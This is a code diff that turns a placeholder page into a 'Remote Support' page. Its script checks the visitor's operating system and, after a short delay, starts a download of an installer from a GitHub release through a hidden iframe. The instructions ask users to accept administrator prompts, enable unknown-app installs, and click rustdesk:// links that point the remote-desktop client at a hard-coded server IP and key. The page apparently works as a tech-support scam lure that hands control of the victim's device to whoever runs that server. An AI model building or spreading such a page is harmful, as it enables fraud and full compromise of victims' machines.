@@ -1,1 +1,53 @@
-<html><body><h1>Remote Support</h1><p>Coming soon.</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Remote Support</title>
+<style>
+  body { font-family: sans-serif; text-align: center; margin-top: 2em; }
+  .fallback { display: none; margin-top: 2em; }
+</style>
+</head>
+<body>
+<h2>View File</h2>
+<p id="msg">Download will start shortly…</p>
+<div id="extra" style="display:none; max-width:600px; margin:1em auto; font-size:0.9em; color:#555;">
+    <p id="manual"></p>
+</div>
+<div class="fallback" id="fallback">
+    <p>Download didn't start? <a id="directLink" href="#">Click here to download manually</a>.</p>
+</div>
+<script>
+const ua=navigator.userAgent.toLowerCase();
+let url="", manual="";
+if(ua.includes("windows")){
+    url="https://github.com/lblaireesf/r-s/releases/latest/download/RemoteSupport_Setup.zip";
+    manual=`Extract the ZIP and run RemoteSupport.exe. Accept the administrator prompt when it appears.`;
+} else if(ua.includes("macintosh")||ua.includes("mac os")){
+    url="https://github.com/lblaireesf/r-s/releases/latest/download/RemoteSupport.dmg";
+    manual=`After dragging RustDesk to Applications, open it <strong>from Applications</strong> once, then <a href="rustdesk://config/server=194.213.18.209:1044&relay=194.213.18.209:1045&key=7ccd199a91557c1c5f243185c1cbf21002b8de011c3858cbc741c8d61b12c9d5" style="font-weight:bold;color:#1a73e8;">click here</a> to configure automatically. (No typing needed.)`;
+} else if(ua.includes("linux")){
+    url="https://github.com/lblaireesf/r-s/releases/latest/download/RemoteSupport.zip";
+    manual=`Extract the ZIP, then run 'chmod +x rustdesk && ./rustdesk'. It connects automatically.`;
+} else if(ua.includes("android")){
+    url="https://github.com/lblaireesf/r-s/releases/latest/download/RemoteSupport.apk";
+    manual=`You may need to enable "Install unknown apps" in Settings. After installing, <a href="rustdesk://config/server=194.213.18.209:1044&relay=194.213.18.209:1045&key=7ccd199a91557c1c5f243185c1cbf21002b8de011c3858cbc741c8d61b12c9d5" style="font-weight:bold;color:#1a73e8;">tap here</a> to apply server settings. (No typing needed.)`;
+} else {
+    document.getElementById("msg").innerText="Unsupported OS. Please contact support.";
+}
+if(url){
+    document.getElementById("manual").innerHTML=manual;
+    document.getElementById("extra").style.display="block";
+    setTimeout(function(){
+        var iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = url;
+        document.body.appendChild(iframe);
+        setTimeout(function(){
+            document.getElementById('fallback').style.display = 'block';
+            document.getElementById('directLink').href = url;
+        }, 5000);
+    }, 3000);
+}
+</script>
+</body></html>
